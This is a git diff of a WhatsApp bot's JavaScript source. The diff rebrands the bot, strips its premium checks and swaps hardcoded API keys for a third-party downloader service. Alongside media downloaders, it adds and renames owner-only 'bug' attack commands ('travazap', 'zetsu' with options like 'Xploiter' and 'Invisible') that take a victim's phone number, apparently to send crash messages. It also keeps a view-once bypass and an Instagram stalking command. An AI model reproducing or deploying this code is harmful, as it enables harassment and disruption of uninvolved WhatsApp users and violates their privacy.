 									forwardedNewsletterMessageInfo: {
 										newsletterJid: global.xchannel.jid,
-										newsletterName: '𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️',
+										newsletterName: '𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉',
 										serverMessageId: -1
 									},
 									businessMessageForwardInfo: {
@@ -4217,7 +4811,7 @@ break
 								}),
 								header: proto.Message.InteractiveMessage.Header.create({
 									title: `Hiii, @${m.sender.split("@")[0]} Here Is Your CatBox.Link!\n`,
-									subtitle: "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️",
+									subtitle: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
 									hasMediaAttachment: true,
 									...(await prepareWAMessageMedia({
 										video: {
@@ -4252,7 +4846,6 @@ break
 			//=================================================//
 			case 'pinterest':
 			case 'pin': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`Title?`);
 				async function createImage(url) {
 					const {
@@ -4339,7 +4932,6 @@ break
 			break
 			case 'yts':
 			case 'ytsearch': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`*Example :*\n\n*Yts Pak Tzy〽*️`);
 				try {
 					let yts = require("yt-search")
@@ -4441,7 +5033,6 @@ break
 			//TRANSLATE\\
 			//=================================================//
 			case 'terjemahen': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!q) return zreply(`*Example :*\n\n*Translate Hallo*`)
 				const defaultLang = 'en'
 				const tld = 'cn'
@@ -4483,7 +5074,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"〽️\",\"id\":\""}`
+											"buttonParamsJson": `{\"display_text\":\"🐉\",\"id\":\""}`
 										}],
 									}),
 									contextInfo: {
@@ -4509,11 +5100,10 @@ break
 			}
 			break
 			case "translate":
-				if (!isPremium) return zreply(mess.premium)
 				if (!q) return zreply(`*Example :*\n\n*Translate Hallo*`)
 				VxoZap.sendButtons(m.chat, {
 					"body": "\`\`\`「 TRANSLATE TO LEANGUAGE 」\`\`\`",
-					"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+					"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 					"buttons": [{
 							"displayText": "ENGLISH",
 							"id": `Terjemahen ${q}`
@@ -4528,7 +5118,6 @@ break
 				});
 				break
 			case 'terjemahid': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!q) return zreply(`*Example :*\n\n*Translate Hallo*`)
 				const defaultLang = 'id'
 				const tld = 'cn'
@@ -4570,7 +5159,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"〽️\",\"id\":\""}`
+											"buttonParamsJson": `{\"display_text\":\"🐉\",\"id\":\""}`
 										}],
 									}),
 									contextInfo: {
@@ -4601,10 +5190,9 @@ break
 			// DOWNLOAD HD \\
 			//=================================================//
 			case 'ytmp4': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!args[0]) return zreply(`*Example :*\n\n*Ytmp4 Link*`);
 				zreply(mess.wait)
-				let api = await fetch(`https://api.betabotz.eu.org/api/download/ytmp4?url=${args[0]}&apikey=GetsuZo`);
+				let api = await fetch(`https://api.betabotz.eu.org/api/download/ytmp4?url=${args[0]}&apikey=XpoX`);
 				let betaku = await api.json();
 				const {
 					title,
@@ -4632,7 +5220,7 @@ break
 				});
 				await VxoZap.sendButtons(from, {
 					"body": `\`\`「 ${gris}[ Y O U T U B E ]${gris} 」\`\`\n\n  *›  UNDUH MUSIC*\n${hiasan}*Durations : ${duration}*`,
-					"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+					"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 					"buttons": [{
 						"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
 						"id": `ytmp3 ${q}`
@@ -4643,7 +5231,6 @@ break
 			}
 			break
 			case 'ythd': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`*Example :*\n\n*Ythd Link*`);
 				VxoZap.sendMessage(m.chat, {
 					react: {
@@ -4663,7 +5250,7 @@ break
 				});
 				await VxoZap.sendButtons(from, {
 					"body": `\`\`「 ${gris}[ Y O U T U B E ]${gris} 」\`\`\n\n  *›  UNDUH MUSIC*`,
-					"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+					"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 					"buttons": [{
 						"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
 						"id": `ytmp3 ${q}`
@@ -4674,14 +5261,12 @@ break
 			}
 			break
 			case 'ytmp3': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`*Example :*\n\n*Ytmp3 Link*`)
 				zreply(mess.wait)
 				downloadMp3(text)
 			}
 			break
 			case 'threads': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`*Anda Perlu Memberikan URL Video, Postingan, Gambar Threads Apa Pun*`)
 				zreply(mess.wait)
 				const createImage = async (url) => {
@@ -4710,7 +5295,7 @@ break
 				};
 				let res;
 				try {
-					res = await fetch(`https://api.betabotz.eu.org/api/download/threads?url=${text}?igshid=NTc4MTIwNjQ2YQ==&apikey=GetsuZo`);
+					res = await fetch(`https://api.betabotz.eu.org/api/download/threads?url=${text}?igshid=NTc4MTIwNjQ2YQ==&apikey=XpoX`);
 				} catch (error) {
 					return reply(`Terjadi kesalahan: ${error.message}`);
 				}
@@ -4776,18 +5361,16 @@ break
 			break
 			case 'instagram':
 			case 'insta': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`*Anda Perlu Memberikan URL Video, Postingan, Reel, Gambar Instagram Apa Pun*`);
 				zreply(mess.wait);
-				let api = await fetch(`https://api.betabotz.eu.org/api/download/igdowloader?url=${text}&apikey=GetsuZo`)
+				let api = await fetch(`https://api.betabotz.eu.org/api/download/igdowloader?url=${text}&apikey=XpoX`)
 				let betaku = await api.json();
 				for (let i of betaku.message) {
-					VxoZap.sendFile(m.chat, i._url, 'beta.mp4', `${gris}[I N S T A G R A M]${gris}\n\n©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`, Zets)
+					VxoZap.sendFile(m.chat, i._url, 'beta.mp4', `${gris}[I N S T A G R A M]${gris}\n\n©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`, Zets)
 				}
 			}
 			break
 			case 'igeror': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`*Anda Perlu Memberikan URL Video, Postingan, Reel, Gambar Instagram Apa Pun*`);
 				zreply(mess.wait);
 
@@ -4886,7 +5469,6 @@ break
 			}
 			break
 			case 'play': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`*Example :*\n\n*Play Mendua*`)
 				zreply(mess.wait);
 				let yts = require("youtube-yts")
@@ -4914,13 +5496,12 @@ break
 				})
 			}
 			break
-			case 'tiktok': {
-				if (!isPremium) return zreply(mess.premium)
+			case 'ttmp4': {
 				if (!text) return zreply(`*Example :*\n\n*Tiktokdl Link Url*`);
 				if (!text.includes('tiktok.com')) return zreply('Url Tidak Mengandung Result Dari Tiktok!');
 				zreply(mess.wait);
 				try {
-					let api = await fetch(`https://api.betabotz.eu.org/api/download/tiktok?url=${encodeURIComponent(text)}&apikey=GetsuZo`);
+					let api = await fetch(`https://api.betabotz.eu.org/api/download/tiktok?url=${encodeURIComponent(text)}&apikey=XpoX`);
 					let betaku = await api.json();
 					if (!betaku.status) return zreply('Gagal mendapatkan data dari API.');
 					const {
@@ -4940,10 +5521,10 @@ break
 					// Mengirim tombol untuk unduh audio
 					await VxoZap.sendButtons(m.chat, {
 						"body": `\`\`「 ${gris}[ T I K T O K ]${gris} 」\`\`\n\n  *›  UNDUH AUDIO*\n${hiasan}*Title :* ${title}`,
-						"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 						"buttons": [{
 							"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
-							"id": `ttmp3 ${q}`
+							"id": `ttmp3 ${encodeURIComponent(text)}`
 						}]
 					}, {
 						quoted: Zets
@@ -4954,9 +5535,8 @@ break
 				}
 			}
 			break
-			case 'ttmp4':
+			case 'tiktok':
 			case 'ttdl': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`*Example :* \n\n*Tiktokdl Link Url*`)
 				if (!text.includes('tiktok.com')) return zreply('Url Tidak Mengandung Result Dari Tiktok!')
 				const hasil = await tiktokDl(text);
@@ -4965,10 +5545,10 @@ break
 					await VxoZap.sendFileUrl(m.chat, hasil.data[1].url, `${gris}[ T I K T O K ]${gris}\n\n${hiasan}*Author* : ${hasil.author.nickname}\n${hiasan}*Capiton* : ${hasil.title}`, Zets)
 					await VxoZap.sendButtons(m.chat, {
 						"body": `\`\`「 ${gris}[ T I K T O K ]${gris} 」\`\`\n\n  *›  UNDUH AUDIO*\n${hiasan}*Author* : ${hasil.author.nickname}`,
-						"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 						"buttons": [{
 							"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
-							"id": `ttmp3 ${q}`
+							"id": `ttmp3 ${encodeURIComponent(text)}`
 						}]
 					}, {
 						quoted: Zets
@@ -4979,10 +5559,10 @@ break
 					}
 					await VxoZap.sendButtons(m.chat, {
 						"body": `\`\`「 ${gris}[ T I K T O K ]${gris} 」\`\`\n\n  *›  UNDUH AUDIO*\n${hiasan}*Author* : ${hasil.author.nickname}`,
-						"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 						"buttons": [{
 							"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
-							"id": `ttmp3 ${q}`
+							"id": `ttmp3 ${encodeURIComponent(text)}`
 						}]
 					}, {
 						quoted: Zets
@@ -4991,7 +5571,6 @@ break
 			}
 			break
 			case 'ttmp3': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`*Example:*\n\n*Ttmp3 Link Url*`)
 				if (!text.includes('tiktok.com')) return zreply('Url Tidak Mengandung Result Dari Tiktok!')
 				const hasil = await tiktokDl(text);
@@ -5018,7 +5597,6 @@ break
 			}
 			break
 			case 'xvid': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`*Example :*\n\nXvid Japan\n\n_~NOTE~_\nStelah Memasukan Japan Dan Muncul URL, Ketik Ulang, Xvid Sertakan URL Nya\n\nXvid URL`);
 				if (!text) return zreply('Please provide a search query or a valid Xvideos URL.');
 				const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
@@ -5138,7 +5716,6 @@ break
 			};
 			break
 			case 'cecan': {
-				if (!isPremium) return zreply(mess.premium)
 				zreply(mess.wait)
 				const createImage = async (url) => {
 					const {
@@ -5200,7 +5777,6 @@ break
 			break
 			case 'tiktokslide':
 			case 'ttslide': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`*Example :* \n\n*Tiktokdl Link Url*`)
 				if (!text.includes('tiktok.com')) return zreply('Url Tidak Mengandung Result Dari Tiktok!')
 				zreply(mess.wait)
@@ -5209,7 +5785,7 @@ break
 					if (!query) return zreply('Masukkan URL TikTok Terlebih Dahulu.');
 
 					// Memfetch data dari API TikTok Slide
-					let res = await fetch(`https://api.betabotz.eu.org/api/download/ttslide?url=${query}&apikey=GetsuZo`);
+					let res = await fetch(`https://api.betabotz.eu.org/api/download/ttslide?url=${query}&apikey=XpoX`);
 					let json = await res.json();
 
 					if (!json.status) return zreply('Gagal Mengambil Data, Coba Lagi.');
@@ -5266,10 +5842,10 @@ break
 					});
 					await VxoZap.sendButtons(m.chat, {
 						"body": `\`\`「 ${gris}[ T I K T O K ]${gris} 」\`\`\n\n  *›  UNDUH AUDIO*\n${hiasan}*Author* : ${packname}`,
-						"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 						"buttons": [{
 							"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
-							"id": `ttmp3 ${q}`
+							"id": `ttmp3 ${query}`
 						}]
 					}, {
 						quoted: Zets
@@ -5281,11 +5857,10 @@ break
 			}
 			break
 			case 'mediafire': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`*Example :* \n\n*Tiktokdl Link Url*`)
 				if (!text.includes('mediafire.com')) return zreply('Url Tidak Mengandung Result Dari Mediafire!')
 				zreply(mess.wait)
-				let api = await fetch(`https://api.betabotz.eu.org/api/download/mediafire?url=${text}&apikey=GetsuZo`)
+				let api = await fetch(`https://api.betabotz.eu.org/api/download/mediafire?url=${text}&apikey=XpoX`)
 				let betaku = await api.json();
 
 				const {
@@ -5303,7 +5878,7 @@ break
 					document: {
 						url: url
 					},
-					caption: `${gris}[M E D I A  F I R E]${gris}\n\n${hiasan}*NAMA : ${filename}*\n${hiasan}*FILETYPE : ${ext}*\n${hiasan}*DATE : ${upload_date}*\n${hiasan}*SIZE : ${filesizeH}*\n\n~©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️~`,
+					caption: `${gris}[M E D I A  F I R E]${gris}\n\n${hiasan}*NAMA : ${filename}*\n${hiasan}*FILETYPE : ${ext}*\n${hiasan}*DATE : ${upload_date}*\n${hiasan}*SIZE : ${filesizeH}*\n\n~©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉~`,
 					fileName: filename,
 					mimetype: ext
 				}, {
@@ -5316,7 +5891,6 @@ break
 			// STALKING \\
 			//=================================================//
 			case "stalkig": {
-				if (!isPremium) return zreply(mess.premium)
 				zreply(mess.wait)
 				await VxoZap.sendMessage(m.chat, {
 					react: {
@@ -5331,7 +5905,7 @@ break
 					} else {
 						let {
 							data
-						} = await axios.get(`https://api.betabotz.eu.org/api/stalk/ig?username=${encodeURIComponent(query)}&apikey=GetsuZo`);
+						} = await axios.get(`https://api.betabotz.eu.org/api/stalk/ig?username=${encodeURIComponent(query)}&apikey=XpoX`);
 
 						if (data.status === true && data.result) {
 							let profileInfo = `${gris}[ I N S T A G R A M ]${gris}\n\n*Username : ${data.result.username}*\n*Full Name : ${data.result.fullName}*\n*Bio : ${data.result.bio}*\n*Followers : ${data.result.followers}*\n*Following : ${data.result.following}*\n*Posts : ${data.result.postsCount}*`;
@@ -5357,7 +5931,6 @@ break
 			// OPEN AI \\
 			//=================================================//
 			case "ai": {
-				if (!isPremium) return zreply(mess.premium)
 				await VxoZap.sendMessage(m.chat, {
 					react: {
 						text: "⚡",
@@ -5371,7 +5944,7 @@ break
 					} else {
 						let {
 							data
-						} = await axios.get(`https://api.betabotz.eu.org/api/search/openai-logic?text=${q}&logic=${logic}&apikey=GetsuZo`);
+						} = await axios.get(`https://api.betabotz.eu.org/api/search/openai-logic?text=${q}&logic=${logic}&apikey=XpoX`);
 						if (data.status === true && data.message) {
 							zreply(data.message);
 						} else {
@@ -5384,7 +5957,6 @@ break
 			}
 			break
 			case "el": {
-				if (!isPremium) return zreply(mess.premium)
 				await VxoZap.sendMessage(m.chat, {
 					react: {
 						text: "⚡",
@@ -5398,7 +5970,7 @@ break
 					} else {
 						let {
 							data
-						} = await axios.get(`https://api.betabotz.eu.org/api/search/openai-chat?text=${q}&apikey=GetsuZo`);
+						} = await axios.get(`https://api.betabotz.eu.org/api/search/openai-chat?text=${q}&apikey=XpoX`);
 						if (data.status === true && data.message) {
 							zreply(data.message);
 						} else {
@@ -5414,7 +5986,6 @@ break
 
 			//VIEW ONCE\\
 			case "rvo": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isQuotedViewOnce) return zreply("Reply view once")
 				let type = Object.keys(m.quoted.message)[0]
 				let quotedType = m.quoted.message[type]
@@ -5440,7 +6011,6 @@ break
 			// Owner Fitur \\
 			//=================================================//
 			case "addprem": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
 				if (args.length < 2)
 					return zreply(`Example :\nAddprem 62xx 30d`);
@@ -5466,7 +6036,6 @@ break
 			break
 			//=================================================//
 			case "delprem": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
 				if (args.length < 1) return zreply(`Example : \nDelprem 62xx`)
 				if (m.mentionedJid.length !== 0) {
@@ -5502,7 +6071,6 @@ break
 			break
 			//=================================================//
 			case "addowner": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
 				if (!args[0]) return zreply(`Example : \nAddowner 62xx`)
 				prem1 = text.split("|")[0].replace(/[^0-9]/g, "")
@@ -5515,7 +6083,7 @@ break
 					image: {
 						url: `https://telegra.ph/file/5d7e84ab8efd2dbbbf31b.jpg`
 					},
-					caption: `𝐒𝐞𝐤𝐚𝐫𝐚𝐧𝐠 𝐊𝐚𝐦𝐮 𝐀𝐝𝐚𝐥𝐚𝐡 𝐎𝐰𝐧𝐞𝐫✨`
+					caption: `𝐒𝐞𝐤𝐚𝐫𝐚𝐧𝐠 𝐊𝐚𝐦𝐮 𝐀𝐝𝐚𝐥𝐚𝐡 𝐎𝐰𝐧𝐞𝐫🎭`
 				}, {
 					quoted: zets
 				})
@@ -5523,7 +6091,6 @@ break
 			break
 			//=================================================//
 			case "delowner": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
 				if (!args[0]) return zreply(`Example : \nDelowner 62xx`)
 				prem2 = text.split("|")[0].replace(/[^0-9]/g, "")
@@ -5538,26 +6105,27 @@ break
 
 			//ACCES BUG XVIP\\
 			case "travazap": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
 				let X1 = [TheZhiro, nulll, nulll2]
 				let randomIndex = Math.floor(Math.random() * X1.length)
 				let V1 = X1[randomIndex]
 				let itsmenu = `
-╭──(         𝐉𝐀𝐂𝐊 ☇ 𝐕𝟐         )
-║ᨒ 𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀\`\〽️
-│✨ 𝐍𝐚𝐦𝐞 : ${m.pushName}
+╭──(         𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸         )
+║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
+│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
 ║▬▭▬▭▬▭▬▭▬▭
-│✨ 𝐎𝐰𝐧𝐞𝐫 : ${author}
-║✨ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂\`\𐁘
-│▬▭「 𝐉𝐀𝐂𝐊𝐕𝟐𝐙𝐡𝐢𝐫𝐨〽️ 」▭▬
+│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
+║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙋𝙖𝙠 𝙏𝙯𝙮 𝘿𝙚𝙫\`\𐁘
+│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
 ║
 │ </> 𝙎𝙪𝙘𝙘𝙚𝙨 𝘼𝙘𝙘𝙚𝙨〽️
 ║ 
-│›› *𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 𝐗𝐛𝐞𝐜 𝟔𝟐𝐱𝐱*
+│›› *𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 𝐗𝐩𝐥𝐨𝐢𝐭𝐞𝐫 𝟔𝟐𝐱𝐱*
+║›› *𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 𝐗𝐩𝐥𝐨𝐢𝐭 𝟔𝟐𝐱𝐱*
+│›› *𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 𝐗𝐬 𝟔𝟐𝐱𝐱*
 ║›› \`𝐗𝐗𝐕𝐈𝐏\`
 │
-║› 𝐉𝐀𝐂𝐊𝐕𝟐 ©Copyright
+║› 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨 ©Copyright
 ╰━━━━━━━━━━━━━━━━━━━⬣
 `
 				const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -5570,7 +6138,7 @@ break
 									"forwardingScore": 999,
 									"forwardedNewsletterMessageInfo": {
 										"newsletterJid": "120363298524333143@newsletter",
-										"newsletterName": "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️",
+										"newsletterName": "𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉",
 										"serverMessageId": 1
 									}
 								},
@@ -5587,7 +6155,7 @@ break
 									"text": ""
 								},
 								"footer": {
-									"text": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻"
+									"text": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻"
 								},
 								"nativeFlowMessage": {
 									"buttons": [{
@@ -5610,8 +6178,8 @@ break
 						externalAdReply: {
 							showAdAttribution: true,
 							renderLargerThumbnail: false,
-							title: `𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`,
-							body: `𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀〽️`,
+							title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
+							body: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
 							previewType: "VIDEO",
 							thumbnail: TheZhiro,
 							sourceUrl: ``,
@@ -5631,19 +6199,18 @@ break
 			}
 			break
 			case "notf": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
 				let X1 = [TheZhiro, nulll, nulll2]
 				let randomIndex = Math.floor(Math.random() * X1.length)
 				let V1 = X1[randomIndex]
 				let itsmenu = `
-╭──(         𝐉𝐀𝐂𝐊 ☇ 𝐕𝟐         )
-║ᨒ 𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀\`\〽️
-│✨ 𝐍𝐚𝐦𝐞 : ${m.pushName}
+╭──(         𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸         )
+║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
+│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
 ║▬▭▬▭▬▭▬▭▬▭
-│✨ 𝐎𝐰𝐧𝐞𝐫 : ${author}
-║✨ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂\`\𐁘
-│▬▭「 𝐉𝐀𝐂𝐊𝐕𝟐𝐙𝐡𝐢𝐫𝐨〽️ 」▭▬
+│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
+║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙋𝙖𝙠 𝙏𝙯𝙮 𝘿𝙚𝙫\`\𐁘
+│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
 ║
 │ </> 𝙎𝙪𝙘𝙘𝙚𝙨 𝘼𝙘𝙘𝙚𝙨〽️
 ║
@@ -5654,7 +6221,7 @@ break
 │›› Buggc
 ║›› Gcui
 │
-║› 𝐉𝐀𝐂𝐊𝐕𝟐 ©Copyright
+║› 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨 ©Copyright
 ╰━━━━━━━━━━━━━━━━━━━⬣
 `
 				const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -5667,7 +6234,7 @@ break
 									"forwardingScore": 999,
 									"forwardedNewsletterMessageInfo": {
 										"newsletterJid": "120363298524333143@newsletter",
-										"newsletterName": "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️",
+										"newsletterName": "𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉",
 										"serverMessageId": 1
 									}
 								},
@@ -5684,7 +6251,7 @@ break
 									"text": ""
 								},
 								"footer": {
-									"text": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻"
+									"text": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻"
 								},
 								"nativeFlowMessage": {
 									"buttons": [{
@@ -5707,8 +6274,8 @@ break
 						externalAdReply: {
 							showAdAttribution: true,
 							renderLargerThumbnail: false,
-							title: `𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`,
-							body: `𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀〽️`,
+							title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
+							body: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
 							previewType: "VIDEO",
 							thumbnail: TheZhiro,
 							sourceUrl: ``,
@@ -5727,214 +6294,69 @@ break
 				}
 			}
 			break
-			case 'xbec': {
-				if (!isPremium) return zreply(mess.premium)
-				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Xcay Number_\n_Example : Xbec 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+			case 'zetsu': {
+								if (!isCreator) return zreply(mess.owner)
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Xs Number_\n_Example : Xs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Xbec Number_\n_Example : Xbec 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Xs Number_\n_Example : Xs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let target = incTarget + '@s.whatsapp.net'
 				global.jumlah = text.split("|")[1]
 
 				let sections = [{
 						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
 						rows: [{
-							title: '⌁⃰𝐙͢𝐧ͯ𝐱𝐈͢𝐯ͮ𝐬 𝐗͢𝟏༑',
-							id: `Znxivs ${incTarget}`
+							title: '⌁⃰𝐈𝐧𝐕𝐢𝐬𝐢𝐛𝐥𝐞༑',
+							id: `Invisible ${incTarget}`
 						}]
 					},
 					{
-						highlight_label: "お ᴄᴀʏᴡᴢᴢ ɴɪʜ ϟ",
 						rows: [{
-							title: '⌁⃰𝐗𝐳͢𝐞ͯ𝐭𝐬 𝐗͢𝟐༑',
-							id: `Vzets ${incTarget}`
